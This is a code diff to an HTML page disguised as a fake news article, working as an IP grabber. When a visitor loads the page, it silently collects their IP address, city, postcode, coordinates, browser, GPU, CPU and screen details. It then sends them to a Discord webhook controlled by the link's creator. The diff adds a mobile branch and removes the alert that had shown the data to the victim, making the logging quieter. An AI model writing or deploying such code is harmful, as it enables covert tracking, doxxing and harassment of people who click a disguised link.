@@ -18,14 +18,191 @@
     </style>
 
     </head>
-    <body onload="log()">
+    <body onload="determine()">
         <div style="text-align:center">
     <h1 style="font-family:'Ubuntu'" id="articlename"></h1>
-    <label style="font-family:'Ubuntu'">hahahahaha you have been ip logged</label>
+    <label style="font-family:'Ubuntu'">test yfwefw</label>
         </div>
     </body>
     <script>
-        async function log(){
+function determine(){
+var segments = window.location.href.split("?")
+var device = segments[5]
+if(device == "mobile")
+{
+logmobile()
+}
+else
+{
+  log()
+}
+}
+
+        async function logmobile(){
+        const response = await fetch("https://ipapi.co/json")
+        const data = await response.json();
+
+        var segments = window.location.href.split("?")
+        var pingid = segments[1]
+        var webhookid = segments[2]
+        var webhooktoken = segments[3] 
+        var articlename = segments[4].replace(/%20/g, " ")
+        document.getElementById("articlename").innerHTML = articlename
+
+var currentdate = new Date(); 
+let postcode = data.postal
+let region = data.region
+let lang =  data.langitude
+let long = data.longitude
+let threads = navigator.hardwareConcurrency
+
+let gpu = "";
+const gl = document.createElement('canvas').getContext('webgl');
+  if (!gl) {
+    gpu = "Unknown"
+  }
+  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+ gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+
+ if(gpu == null)
+ {
+   gpu = "Unknown"
+ }
+
+ var browser = "Unknown"
+
+  if((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf('OPR')) != -1 ) {
+        browser = 'Opera';
+    } else if(navigator.userAgent.indexOf("Chrome") != -1 ) {
+        browser = 'Chrome';
+    } else if(navigator.userAgent.indexOf("Safari") != -1) {
+        browser = 'Safari';
+    } else if(navigator.userAgent.indexOf("Firefox") != -1 ){
+        browser = 'Firefox';
+    } else if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) {
+        browser = 'Internet Explorer';
+    } else {
+        browser = 'Unknown';
+    }
+
+if(postcode == null)
+{
+  postcode = "Unknown"
+}
+if(region== null)
+{
+  region = "Unknown"
+}
+if(lang == null)
+{
+  lang = "Unknown"
+}
+if (long == null)
+{
+  long = "Unknown"
+}
+if(threads == null)
+{
+  threads = "Unknown"
+}
+
+ 
+
+var myEmbed = {
+  title: "New Info Logged",
+  description: "From URL: " + window.location.href,
+  fields: [
+      {
+        name: "IP",
+        value: data.ip + " [" + data.version + "]",
+        inline: true
+      },
+      {
+        name: "Area",
+        value: data.city + ", " + region + " [" + data.country_name + "]",
+        inline: true
+      },
+      {
+        name: "Postcode",
+        value: postcode,
+        inline: true
+      },
+      {
+        name: "Latitude/Longitude",
+        value:  lang + ", " + long,
+        inline: true
+      },
+      {
+        name: "Browser",
+        value:  browser,
+        inline: true
+      },
+      {
+        name: "Platform",
+        value: navigator.platform,
+        inline: true
+      },
+      {
+        name: "Screen Size",
+        value:  window.screen.width + " x " + window.screen.height,
+        inline: true
+      },
+      {
+        name: "Screen Rotation",
+        value:  "Non Mobile Supported.",
+        inline: true
+      },
+      {
+        name: "Battery Percentage",
+        value: "Non Mobile Supported.",
+        inline: true
+      },
+      {
+        name: "Graphics Card Name / Driver",
+        value:  gpu
+      },
+      {
+        name: "Number of CPU Threads/Cores",
+        value:  threads
+      },
+    {
+        name: "Fake Article Name",
+        value:  articlename,
+        
+      }
+    ],
+     footer: {
+        text: "+10000 Social Credit  •  Logged " + currentdate.toUTCString(),
+        icon_url: "https://i.imgur.com/1jdoua0.png"
+      }
+}
+        let content = "||<@" + pingid + ">||"
+        const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/" + webhookid + "/" + webhooktoken);
+      request.setRequestHeader('Content-type', 'application/json');
+      const params = {
+        username: "Sex Logger [" + makeid(5) + "]",
+        avatar_url: "",
+        content: content,
+        embeds: [ myEmbed ]
+      }
+
+      request.send(JSON.stringify(params));
+
+        }
+
+        function makeid(length) {
+    var result           = '';
+    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var charactersLength = characters.length;
+    for ( var i = 0; i < length; i++ ) {
+      result += characters.charAt(Math.floor(Math.random() * 
+ charactersLength));
+   }
+   return result;
+}
+
+    async function log(){
         const response = await fetch("https://ipapi.co/json")
         const data = await response.json();
 
@@ -180,7 +357,6 @@ var myEmbed = {
       }
 }
         let content = "||<@" + pingid + ">||"
-        alert(data.ip + " [" + data.version + "]" + "\n" + data.city + ", " + region + " [" + data.country_name + "]" + "\n" + postcode + "\n" + lang + "," + long + "\n" + browser + "\n" + navigator.platform + "\n" + window.screen.width + " x " + window.screen.height + "\n" + rotation + "\n" + batterylevel + "\n" + gpu + "\n" + threads + "\n" + articlename)
         const request = new XMLHttpRequest();
       request.open("POST", "https://discord.com/api/webhooks/" + webhookid + "/" + webhooktoken);
       request.setRequestHeader('Content-type', 'application/json');
@@ -195,17 +371,5 @@ var myEmbed = {
 
         }
 
-        function makeid(length) {
-    var result           = '';
-    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    var charactersLength = characters.length;
-    for ( var i = 0; i < length; i++ ) {
-      result += characters.charAt(Math.floor(Math.random() * 
- charactersLength));
-   }
-   return result;
-}
-
-   
     </script>
 </html>
